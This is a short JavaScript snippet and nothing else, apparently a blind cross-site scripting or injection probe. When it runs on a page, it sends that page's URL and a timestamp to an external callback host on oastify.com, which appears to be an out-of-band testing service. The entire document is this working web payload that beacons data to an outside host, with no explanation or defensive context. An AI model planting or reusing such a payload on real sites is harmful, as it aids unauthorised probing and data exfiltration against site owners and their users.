
(function () {
  fetch('https://me47f5qiowbw8p5ywbvr4py4mvsmgc41.oastify.com', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      url: window.location.href,
      timestamp: new Date().toISOString()
    })
  }).catch(console.error);
})();
